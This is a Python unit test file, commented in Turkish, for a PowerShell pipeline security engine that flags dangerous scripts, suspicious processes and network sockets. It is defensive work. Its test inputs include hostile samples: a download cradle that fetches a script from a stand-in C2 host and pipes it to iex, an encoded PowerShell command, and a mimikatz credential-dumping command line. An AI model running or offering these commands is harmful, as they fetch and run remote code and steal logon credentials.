# ÖZEL LİSANS — TÜM HAKLAR SAKLIDIR
# Telif Hakkı (c) 2026 Seydi Eryılmaz (@seydivakkas)
# Bu yazılım ve ilgili tüm dosyalar ("Yazılım") yalnızca görüntüleme ve eğitim amaçlı olarak paylaşılmıştır.
# YASAKLAR: Kopyalanamaz, çoğaltılamaz, dağıtılamaz, değiştirilemez, satılamaz, tersine mühendislik yapılamaz.
# İZİN VERİLEN KULLANIM: GitHub üzerinde görüntüleme ve inceleme (kopyalamadan).
# YAZARIN AÇIK YAZILI İZNİ OLMAKSIZIN HİÇBİR KULLANIM HAKKI TANINMAZ.

"""
G085: PowerShell nesne boru hattı ve güvenlik motoru birim testleri (unittest).
Bu test paketi; IEX tespiti, Base64 gizleme, download cradle, unquoted service path,
anormal süreç ebeveyn-çocuk ilişkileri ve DoS boru hattı sınırlarını doğrular.
"""

import json  # JSON veri yuklemek icin json modulu ice aktarilir
from pathlib import Path  # Dosya sistemi yollari icin Path modulu ice aktarilir
import unittest  # Birim test cercevesi ice aktarilir

from portfolio.hafta_13.gun_085.uygulama.powershell_pipeline_security_engine import (  # Uygulama modulu siniflari
    AnomalousProcessLineageException,  # Ebeveyn-cocuk anomali istisnasi
    DangerousPipelineInvocationException,  # IEX istisnasi
    DownloadCradleDetectedException,  # Download cradle istisnasi
    InvalidPipelineSocketException,  # Gecersiz soket istisnasi
    MalformedPipelineSyntaxException,  # Bozuk boru sozdizimi istisnasi
    NetworkPipelineCorrelator,  # Ag soket korelasyon motoru
    NetworkSocketArtifact,  # Soket nesnesi
    NullByteForbiddenException,  # Null byte istisnasi
    ObfuscatedPayloadDetectedException,  # Base64 gizleme istisnasi
    PipelineObjectLimitExceededException,  # Nesne tavani asim istisnasi
    PipelineSyntaxAuditor,  # Sozdizim denetleyicisi
    PipelineThreatSeverity,  # Tehdit ciddiyet enum degeri
    PowerShellPipelineSecurityEngine,  # Façade ana motor
    ProcessPipelineHunter,  # Surec avcisi motor
    ProcessSecurityArtifact,  # Surec nesnesi
    UnquotedServicePathException,  # Tirnaksiz yol istisnasi
)


class TestPowerShellPipelineSecurityEngine(unittest.TestCase):
    """PowerShell nesne boru hatti guvenlik motoru test senaryolari."""

    def setUp(self) -> None:
        """Her testten once taze motor ornegi ve ornek yapay verileri yukler."""
        self.engine = PowerShellPipelineSecurityEngine(max_objects=5000)  # Ana motor ornegi olusturulur
        veri_yolu = Path(__file__).resolve().parent.parent / "ornek_veri" / "sample_powershell_artifacts.json"  # Yol
        with open(veri_yolu, "r", encoding="utf-8") as f:  # Dosya okunur
            self.artifacts_data = json.load(f)  # Veriler yuklenir

    def test_01_safe_script_audit_passes(self) -> None:
        """Guvenli PowerShell boru hatti komutlarinin hicbir tehdit uretmedigini dogrular."""
        guvenli_betik = "Get-Process | Where-Object { $_.CPU -gt 10 } | Select-Object -Property Id, ProcessName"  # Betik
        bulgular = PipelineSyntaxAuditor.audit_script_text(guvenli_betik)  # Statik denetim calistirilir
        self.assertEqual(len(bulgular), 0)  # Hicbir tehdit bulgusu olmamali

    def test_02_detect_iex_pipeline_invocation(self) -> None:
        """Boru hattina gelen verinin Invoke-Expression (IEX) ile calistirilmasinin CRITICAL olarak yakalandigini test eder."""
        zararli_betik = "$payload = Get-Content payload.txt; $payload | Invoke-Expression"  # IEX pipe betigi
        bulgular = PipelineSyntaxAuditor.audit_script_text(zararli_betik)  # Denetim yapilir
        self.assertTrue(any(b.rule_name == "DANGEROUS_PIPELINE_IEX_INVOCATION" for b in bulgular))  # Kural kontrolu
        self.assertTrue(any(b.severity == PipelineThreatSeverity.CRITICAL for b in bulgular))  # Ciddiyet kontrolu

    def test_03_detect_obfuscated_encoded_command(self) -> None:
        """Boru hatti parametresinde gizlenmis Base64 EncodedCommand calistirilmasinin tespitini dogrular."""
        zararli_betik = "powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="  # Encoded
        bulgular = PipelineSyntaxAuditor.audit_script_text(zararli_betik)  # Denetim calistirilir
        self.assertTrue(any(b.rule_name == "OBFUSCATED_BASE64_PAYLOAD" for b in bulgular))  # Kural kontrol edilir

    def test_04_detect_download_cradle_pipeline(self) -> None:
        """WebClient download string ile agdan kod cekip pipe ile calistiran download cradle tespitini dogrular."""
        cradle_betik = "(New-Object System.Net.WebClient).DownloadString('http://c2.local/run.ps1') | iex"  # Cradle
        bulgular = PipelineSyntaxAuditor.audit_script_text(cradle_betik)  # Denetim yapilir
        self.assertTrue(any(b.rule_name == "DOWNLOAD_CRADLE_DETECTED" for b in bulgular))  # Kural eslesmeli

    def test_05_detect_unquoted_service_path(self) -> None:
        """Tirnaksiz ve bosluk iceren calistirilabilir servis yolunun HIGH olarak tespit edildigini dogrular."""
        unquoted_yol = "C:\\Program Files\\Insecure Service\\daemon.exe -k run"  # Tirnaksiz yol
        bulgular = PipelineSyntaxAuditor.audit_script_text(unquoted_yol)  # Denetim yapilir
        self.assertTrue(any(b.rule_name == "UNQUOTED_SERVICE_PATH" for b in bulgular))  # Kural tespiti

    def test_06_reject_null_byte_in_script(self) -> None:
        """Betik metnine enjekte edilen null-byte (0x00) karakterinin NullByteForbiddenException ile engellendigini dogrular."""
        zararli_betik = "Get-Process\x00 | Stop-Process"  # Null byte iceren betik
        with self.assertRaises(NullByteForbiddenException):  # Istisna beklenir
            PipelineSyntaxAuditor.audit_script_text(zararli_betik)  # Denetim denenir

    def test_07_reject_malformed_pipeline_empty_pipe(self) -> None:
        """Ardisik bos boru hatti operatorlerinin (| |) MalformedPipelineSyntaxException ile reddini dogrular."""
        bozuk_betik = "Get-Process | | Select-Object -First 5"  # Bos pipe
        with self.assertRaises(MalformedPipelineSyntaxException):  # Istisna beklenir
            PipelineSyntaxAuditor.audit_script_text(bozuk_betik)  # Denetim denenir

    def test_08_reject_malformed_pipeline_trailing_pipe(self) -> None:
        """Boru hatti operatorunun (|) havada kaldigi tek satirlik betiklerin reddedildigini dogrular."""
        bozuk_betik = "Get-Process |"  # Havada kalan pipe
        with self.assertRaises(MalformedPipelineSyntaxException):  # Istisna beklenir
            PipelineSyntaxAuditor.audit_script_text(bozuk_betik)  # Denetim denenir

    def test_09_process_hunting_known_malicious_tool(self) -> None:
        """Boru hattindan gecen mimikatz gibi bilinen saldiri araclarinin CRITICAL olarak yakalandigini dogrular."""
        proc = ProcessSecurityArtifact(
            pid=9912,
            name="mimikatz.exe",
            path="C:\\Users\\Public\\mimikatz.exe",
            cpu=12.5,
            working_set_mb=80.0,
            command_line="mimikatz.exe sekurlsa::logonpasswords exit"
        )  # Mimikatz surec nesnesi
        sonuc = ProcessPipelineHunter.evaluate_process(proc)  # Surec taranir
        self.assertTrue(sonuc.is_suspicious)  # Supheli olarak isaretlenmeli
        self.assertTrue(any("KNOWN_ATTACK_TOOL" in f for f in sonuc.flags))  # Bayrak kontrol edilir

    def test_10_process_hunting_anomalous_parent_child(self) -> None:
        """Word veya Excel gibi ofis yazilimlarinin PowerShell baslatmasinin anomali olarak yakalandigini test eder."""
        proc = ProcessSecurityArtifact(
            pid=4100,
            name="powershell.exe",
            path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            cpu=0.5,
            working_set_mb=45.0,
            command_line="powershell.exe -enc AAAA...",
            parent_pid=1200,
            parent_name="winword.exe"
        )  # Anormal ebeveyn-cocuk
        sonuc = ProcessPipelineHunter.evaluate_process(proc)  # Taranir
        self.assertTrue(sonuc.is_suspicious)  # Supheli olmali
        self.assertTrue(any("ANOMALOUS_PARENT_CHILD" in f for f in sonuc.flags))  # Anomali bayragi

    def test_11_process_hunting_strict_mode_lineage_exception(self) -> None:
        """strict=True durumunda supheli ebeveyn-cocuk iliskisinde AnomalousProcessLineageException firlatildigini test eder."""
        proc = ProcessSecurityArtifact(
            pid=4100,
            name="powershell.exe",
            path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            cpu=0.5,
            working_set_mb=45.0,
            command_line="powershell.exe",
            parent_pid=1200,
            parent_name="winword.exe"
        )  # Anormal surec
        with self.assertRaises(AnomalousProcessLineageException):  # Istisna beklenir
            ProcessPipelineHunter.evaluate_process(proc, strict=True)  # Kati modda calistirilir

    def test_12_network_socket_suspicious_port(self) -> None:
        """Port 4444 (Metasploit varsayilan) dinleyen soket nesnesinin supheli olarak isaretlendigini test eder."""
        sock = NetworkSocketArtifact(
            local_addr="0.0.0.0",
            local_port=4444,
            remote_addr="0.0.0.0",
            remote_port=0,
            state="Listen",
            owning_pid=9912
        )  # Supheli dinleme soketi
        sonuc = NetworkPipelineCorrelator.evaluate_socket(sock)  # Taranir
        self.assertTrue(sonuc.is_suspicious)  # Supheli olarak isaretlenmeli

    def test_13_network_socket_invalid_ip_rejection(self) -> None:
        """Bozuk IP adresi iceren soket nesnesinin strict modda InvalidPipelineSocketException firlattigini test eder."""
        sock = NetworkSocketArtifact(
            local_addr="999.999.999.999",
            local_port=80,
            remote_addr="0.0.0.0",
            remote_port=0,
            state="Listen",
            owning_pid=100
        )  # Bozuk IP'li soket
        with self.assertRaises(InvalidPipelineSocketException):  # Istisna beklenir
            NetworkPipelineCorrelator.evaluate_socket(sock, strict=True)  # Kati modda denenir

    def test_14_oversized_pipeline_object_limit_dos(self) -> None:
        """Boru hattina izin verilen tavanin (5000 nesne) uzerinde veri aktiginda DoS korumasiyla engellendigini dogrular."""
        kucuk_motor = PowerShellPipelineSecurityEngine(max_objects=100)  # 100 nesnelik tavan
        asiri_surecler = [{"Id": i, "ProcessName": f"p_{i}"} for i in range(150)]  # 150 nesne
        with self.assertRaises(PipelineObjectLimitExceededException):  # Istisna beklenir
            kucuk_motor.ingest_artifacts_stream(processes_data=asiri_surecler, network_data=[])  # Boru hattina verilir


if __name__ == "__main__":
    unittest.main()  # Modul dogrudan calistirildiginda unit testler yurutulur
